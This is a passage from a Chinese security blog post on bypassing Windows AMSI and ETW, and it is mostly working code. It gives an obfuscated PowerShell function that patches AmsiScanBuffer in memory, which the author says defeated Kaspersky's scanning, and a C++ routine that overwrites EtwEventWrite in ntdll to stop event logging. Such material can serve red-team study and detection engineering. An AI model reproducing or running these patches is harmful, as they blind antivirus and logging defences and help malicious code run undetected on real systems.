<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs inform7">function PatchAMSI &#123;<br>	$bclwj = @<span class="hljs-string">&quot;</span><br><span class="hljs-string">	using System;</span><br><span class="hljs-string">	using System.Runtime.InteropServices;</span><br><span class="hljs-string">	public class bclwj &#123;</span><br><span class="hljs-string">		<span class="hljs-subst">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="hljs-string">		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span><br><span class="hljs-string">		<span class="hljs-subst">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="hljs-string">		public static extern IntPtr LoadLibrary(string name);</span><br><span class="hljs-string">		<span class="hljs-subst">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="hljs-string">		public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr soiuwo, uint flNewProtect, out uint lpflOldProtect);</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">&quot;</span>@<br>Add-Type $bclwj<br><br>$tmizvav = <span class="hljs-comment">[bclwj]</span>::LoadLibrary(<span class="hljs-string">&quot;$(<span class="hljs-subst">[chAR]</span>(97)+<span class="hljs-subst">[ChAr]</span>(<span class="hljs-subst">[byte]</span>0x6d)+<span class="hljs-subst">[CHAr]</span>(115)+<span class="hljs-subst">[Char]</span>(105)+<span class="hljs-subst">[ChAR]</span>(<span class="hljs-subst">[bYTe]</span>0x2e)+<span class="hljs-subst">[cHaR]</span>(<span class="hljs-subst">[Byte]</span>0x64)+<span class="hljs-subst">[chaR]</span>(<span class="hljs-subst">[bytE]</span>0x6c)+<span class="hljs-subst">[cHar]</span>(108*77/77))&quot;</span>)<br>$pejwnb = <span class="hljs-comment">[bclwj]</span>::GetProcAddress($tmizvav, <span class="hljs-string">&quot;$(<span class="hljs-subst">[cHaR]</span>(65)+<span class="hljs-subst">[ChAR]</span>(<span class="hljs-subst">[byTe]</span>0x6d)+<span class="hljs-subst">[cHaR]</span>(<span class="hljs-subst">[ByTE]</span>0x73)+<span class="hljs-subst">[CHAr]</span>(52+53)+<span class="hljs-subst">[chAR]</span>(83*28/28)+<span class="hljs-subst">[chAr]</span>(99)+<span class="hljs-subst">[cHar]</span>(79+18)+<span class="hljs-subst">[CHaR]</span>(104+6)+<span class="hljs-subst">[cHar]</span>(66)+<span class="hljs-subst">[cHAr]</span>(117+83-83)+<span class="hljs-subst">[chAr]</span>(<span class="hljs-subst">[BytE]</span>0x66)+<span class="hljs-subst">[CHAr]</span>(<span class="hljs-subst">[BYTE]</span>0x66)+<span class="hljs-subst">[CHaR]</span>(101*34/34)+<span class="hljs-subst">[chAr]</span>(<span class="hljs-subst">[ByTE]</span>0x72))&quot;</span>)<br>$p = 0<br><span class="hljs-comment">[bclwj]</span>::VirtualProtect($pejwnb, <span class="hljs-comment">[uint32]</span>5, 0x40, <span class="hljs-comment">[ref]</span>$p)<br>$sabz = <span class="hljs-string">&quot;0xB8&quot;</span><br>$chis = <span class="hljs-string">&quot;0x57&quot;</span><br>$iuhl = <span class="hljs-string">&quot;0x00&quot;</span><br>$qwus = <span class="hljs-string">&quot;0x07&quot;</span><br>$vykl = <span class="hljs-string">&quot;0x80&quot;</span><br>$nygv = <span class="hljs-string">&quot;0xC3&quot;</span><br>$mklio = <span class="hljs-comment">[Byte<span class="hljs-comment">[]</span>]</span> ($sabz,$chis,$iuhl,$qwus,+$vykl,+$nygv)<br><span class="hljs-comment">[System.Runtime.InteropServices.Marshal]</span>::Copy($mklio, 0, $pejwnb, 6)<br>&#125;<br><br><br>INFORM7<br></code></pre></td></tr></table></figure>

<p>然后调用就行,最后再给ps脚本进行混淆处理.</p>
<p><img src="https://kyxiaxiang.github.io/img/003.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://kyxiaxiang.github.io/img/004.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>KES是使用了AMSI的我们这里可以看到,已经成功绕过了,如果只是单纯的混淆powershell脚本,只能绕过静态.当我们途径AMSI时还是会被干掉.</p>
<p>当然并不是说这样就一定可以成功,毕竟EDR也不是吃素的.人家是可以拦截我们patchAmsi的行为,这里需要别的方式去进行绕过.这里不做细究.</p>
<p>现在我们开始聊聊Etw:</p>
<p>ETW首次与 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/event-tracing-for-windows-simplified">Windows 2000 </a>一起引入，最初旨在提供详细的用户和内核日志记录，无需重新启动目标进程即可动态启用或禁用这些日志记录。</p>
<p>ETW 的核心结构自 Windows 2000 以来几乎没有变化，尽管对发送和接收日志的过程进行了多次大修改，以使第三方程序更容易与 ETW 集成。</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing">微软的文档 </a>是这样描述ETW架构的：</p>
<blockquote>
<p>事件跟踪 API 分为三个不同的组件：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers">控制器 </a>，启动和停止事件跟踪会话并启用提供程序</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers">Providers </a>，提供事件</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers">consumers</a>，消费事件</li>
</ul>
</blockquote>
<p>控制器仅限于具有管理员权限的用户，但有一些注意事项。</p>
<p>除了回调之外，Windows 威胁情报事件跟踪还提供来自内核的跟踪，并允许以各种方式使用这些跟踪。</p>
<p><strong>Windows</strong> <strong>事件跟踪 (ETW) 提供了一种机制来跟踪和记录由用户模式应用程序和内核模式驱动程序引发的事件</strong></p>
<p>其部分功能位于ntdll.dll中，我们可以修改内存中的etw相关函数达到禁止日志输出的效果</p>
<p>我们采用修补EtwEventWrite方法进行绕过，是不是和AMSI有异曲同工之妙。同样采用IDA对ntdll.dll进行观察导出函数EtwEventWrite，可以发现我们如果把他的第一个指令修改成返回0，他就g了。</p>
<p>使用C++实现如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">disableETW</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> patch[] = &#123; <span class="hljs-number">0x48</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xc3</span>&#125;;   <span class="hljs-comment">// xor rax, rax; ret</span><br><br>  ULONG oldprotect = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-type">size_t</span> size = <span class="hljs-built_in">sizeof</span>(patch);<br><br>  HANDLE hCurrentProc = <span class="hljs-built_in">GetCurrentProcess</span>();<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sEtwEventWrite[] = &#123; <span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">0x0</span> &#125;;<br><br>  <span class="hljs-type">void</span> *pEventWrite = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);<br><br>  <span class="hljs-built_in">NtProtectVirtualMemory</span>(hCurrentProc, &amp;pEventWrite, (PSIZE_T) &amp;size, PAGE_READWRITE, &amp;oldprotect);<br><br>  <span class="hljs-built_in">memcpy</span>(pEventWrite, patch, size / <span class="hljs-built_in">sizeof</span>(patch[<span class="hljs-number">0</span>]));<br><br>  <span class="hljs-built_in">NtProtectVirtualMemory</span>(hCurrentProc, &amp;pEventWrite, (PSIZE_T) &amp;size, oldprotect, &amp;oldprotect);<br><br>  <span class="hljs-built_in">FlushInstructionCache</span>(hCurrentProc, pEventWrite, size);<br><br>&#125;<br><br> <br><br>ARDUINO<br></code></pre></td></tr></table></figure>

<p>xor rax,rax 获得一个0 ，汇编常用获取0的方法。<strong>EtwEventWrite</strong>修补后无法为当前进程写入事件,懂得都懂。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/bypass/" class="print-no-link">#bypass</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>浅谈AMSI和ETW</div>
      <div>https://kyxiaxiang.github.io/2022/12/14/AMSIandEtw/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>keyixiaxiang</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年12月14日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/11/01/AboutLoadLibrary-01/" title="LoadLibrary的那些事儿（一）">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">LoadLibrary的那些事儿（一）</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
